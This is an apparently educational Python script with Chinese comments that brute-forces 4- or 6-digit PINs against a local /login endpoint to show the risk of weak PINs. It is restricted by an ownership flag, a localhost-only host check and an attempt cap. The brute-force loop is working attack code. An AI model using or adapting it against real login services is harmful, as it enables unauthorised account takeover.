"""
这是一个“课堂本地实验”用的小脚本：它会对本机的 /login 接口反复发送登录请求，
用来演示“弱口令/弱 PIN”带来的风险，以及为什么需要验证码、限速、锁定策略等防护。

重要提醒（请务必遵守）：
1) 只允许对你自己拥有/明确授权的服务进行测试。
2) 本脚本内置了安全保护：默认只允许连接到本机（localhost/127.0.0.1/::1），并且需要显式确认参数才会运行。
"""

import argparse
import http.client
import socket
import time
import urllib.parse


def _make_connection(host: str, port: int, timeout_s: float) -> http.client.HTTPConnection:
    # 创建一个 HTTP 连接对象（相当于“打电话建立线路”），后面可以复用这个连接反复请求。
    return http.client.HTTPConnection(host, port, timeout=timeout_s)


def attempt_login(conn: http.client.HTTPConnection, username: str, password: str) -> bool:
    """
    尝试登录一次：
    - 把 username/password 按网页表单格式编码
    - 向 /login 发送 POST 请求
    - 通过返回码 + Location 头判断是否登录成功
    返回值：True 表示“看起来登录成功”，False 表示失败。
    """
    # 把字典转换成表单字符串，例如：username=alice&password=123456
    body = urllib.parse.urlencode({'username': username, 'password': password})
    headers = {
        # 告诉服务器：这是表单提交（很多网页登录就是这种格式）
        'Content-Type': 'application/x-www-form-urlencoded',
        # 尽量复用连接，减少每次都重新握手的开销
        'Connection': 'keep-alive',
    }
    # 发送请求：POST /login
    conn.request('POST', '/login', body=body, headers=headers)
    resp = conn.getresponse()
    # 一些 Web 框架登录成功后会“重定向”到首页（Location: /index...）
    location = resp.getheader('Location', '')
    # 读取响应体（即使不使用，也要读完，否则连接可能无法复用）
    resp.read()
    # 常见的重定向状态码：301/302/303/307/308
    return resp.status in (301, 302, 303, 307, 308) and location.startswith('/index')


def iter_pin4(start: int = 0):
    """生成 4 位 PIN：0000 ~ 9999（从 start 开始）。"""
    start = max(0, int(start))
    for i in range(start, 10000):
        # f"{i:04d}" 表示把数字补齐成 4 位，不够的左边补 0
        yield f"{i:04d}"


def iter_pin6(start: int = 0):
    """生成 6 位 PIN：000000 ~ 999999（从 start 开始）。"""
    start = max(0, int(start))
    for i in range(start, 1000000):
        # f"{i:06d}" 表示把数字补齐成 6 位，不够的左边补 0
        yield f"{i:06d}"


def main():
    # argparse：用于从命令行读取参数（类似“填写设置”）
    parser = argparse.ArgumentParser(description='Online brute-force demo (for classroom local lab only).')
    parser.add_argument('--host', default='127.0.0.1')
    parser.add_argument('--port', default=8080, type=int)
    parser.add_argument('--username', required=True)
    parser.add_argument('--mode', choices=['pin4', 'pin6'], default='pin6')
    parser.add_argument('--max', type=int, default=500, help='Max attempts (default: 500)')
    parser.add_argument('--start', type=int, default=0, help='Start PIN as an integer (default: 0)')
    parser.add_argument('--sleep', type=float, default=0.0, help='Sleep between attempts (seconds)')
    parser.add_argument('--timeout', type=float, default=5.0, help='Per-request timeout (seconds)')
    parser.add_argument('--retries', type=int, default=3, help='Retries on transient network errors')
    parser.add_argument('--retry-sleep', type=float, default=0.05, help='Sleep between retries (seconds)')
    # “安全确认开关”：避免误操作。只有你明确声明“这是我拥有/已授权的服务”才会运行。
    parser.add_argument(
        '--i-own-this-service',
        action='store_true',
        help='Required safety flag. Confirms you own/have permission to test this local service.',
    )
    args = parser.parse_args()

    # ---------------------------
    # 安全保护：只允许本机测试
    # ---------------------------
    if not args.i_own_this_service:
        raise SystemExit(
            'Refusing to run: add --i-own-this-service to confirm you own/have permission to test this LOCAL service.'
        )
    allowed_hosts = {'127.0.0.1', 'localhost', '::1'}
    if args.host not in allowed_hosts:
        raise SystemExit(f"Refusing to run against non-local host: {args.host!r}. Use localhost/127.0.0.1/::1 only.")
    if not (1 <= int(args.port) <= 65535):
        raise SystemExit(f"Invalid --port: {args.port}. Must be 1~65535.")

    # 根据模式选择“候选密码生成器”
    if args.mode == 'pin4':
        candidates = iter_pin4(args.start)
    elif args.mode == 'pin6':
        candidates = iter_pin6(args.start)
    else:
        raise SystemExit('unsupported mode')

    # 记录开始时间，用于统计总耗时
    start = time.time()
    # 先建立一次连接，后面尽量复用
    conn = _make_connection(args.host, args.port, args.timeout)
    for idx, pw in enumerate(candidates, start=1):
        # idx：第几次尝试（从 1 开始）；pw：这次要尝试的 PIN
        if idx > args.max:
            break
        ok = False
        # 网络可能会偶尔断开/超时，所以这里做“重试”
        for attempt in range(args.retries + 1):
            try:
                ok = attempt_login(conn, args.username, pw)
                break
            except (http.client.RemoteDisconnected, ConnectionResetError, BrokenPipeError, socket.timeout, OSError) as e:
                try:
                    conn.close()
                except Exception:
                    pass
                conn = _make_connection(args.host, args.port, args.timeout)

                if attempt >= args.retries:
                    # 重试次数用完了：把异常抛出去，让程序报错退出（方便你发现问题）
                    raise
                errno = getattr(e, 'errno', None)
                if errno == 49:
                    # Errno 49：地址/端口资源临时用尽，稍微等一下更稳
                    time.sleep(max(args.retry_sleep, 0.01))
                else:
                    time.sleep(max(args.retry_sleep, 0.0))
        if ok:
            cost = time.time() - start
            print(f"[SUCCESS] username={args.username} password={pw} attempts={idx} time={cost:.2f}s")
            try:
                conn.close()
            except Exception:
                pass
            return 0
        if args.sleep > 0:
            # 每次尝试之间“刻意等一下”，避免太快把服务打爆（也更像真实防护下的情况）
            time.sleep(args.sleep)
        if idx % 50 == 0:
            # 每 50 次打印一次进度
            print(f"[progress] attempts={idx}")

    cost = time.time() - start
    try:
        conn.close()
    except Exception:
        pass
    print(f"[FAILED] no success within attempts={args.max} time={cost:.2f}s")
    return 1


if __name__ == '__main__':
    # 作为脚本直接运行时，从 main() 返回退出码
    raise SystemExit(main())
